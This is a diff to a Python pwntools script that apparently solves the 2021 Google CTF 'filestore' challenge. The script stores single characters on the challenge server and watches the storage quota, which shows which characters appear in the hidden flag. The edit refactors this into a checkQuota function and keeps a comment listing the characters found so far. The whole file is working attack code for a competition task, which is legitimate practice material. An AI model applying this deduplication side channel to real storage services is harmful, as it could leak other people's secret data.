@@ -14,35 +14,13 @@ conn.close()
 
 valid = []
 
-for char in string.printable[:-6]:
+# extract the true charactor/text in the flag 
+def checkQuota(text):
     conn = remote('filestore.2021.ctfcompetition.com', 1337)
     conn.recvuntil("exit")
     conn.sendline(b"store")
     conn.recv()
-    conn.sendline(f"{char}")
-    conn.recvuntil("Menu")
-
-    conn.sendline(b"status")
-    received = conn.recvuntil("Menu").decode()
-    match = re.search(r"Quota: (.+)/64.000kB", received)
-
-    quota = match[1]
-    if quota == target_quota:
-        print(f"{char} works!")
-        valid.append(char)
-
-    conn.close()
-
-print(valid)
-
-#################################################################
-# check byte array size of blob
-def checkQuota(flagpart):
-    conn = remote('filestore.2021.ctfcompetition.com', 1337)
-    conn.recvuntil("exit")
-    conn.sendline(b"store")
-    conn.recv()
-    conn.sendline(f"{flagpart}")
+    conn.sendline(f"{text}")
     conn.recvuntil("Menu")
     conn.sendline(b"status")
     received = conn.recvuntil("Menu").decode()
@@ -50,6 +28,18 @@ def checkQuota(flagpart):
     quota = match[1]
     return quota
 
+# find all letters, digits, and punctuation in the flag 
+for char in string.printable[:-6]:
+    quota = checkQuota(char)
+    if quota == target_quota:
+        print(f"{char} works!")
+        valid.append(char)
+
+    conn.close()
+    
+print(valid)
+
+#################################################################
 # valid = ['0', '1', '3', '4', 'c', 'd', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', 'T', '_', '{', '}']
 flagpart = ''
 
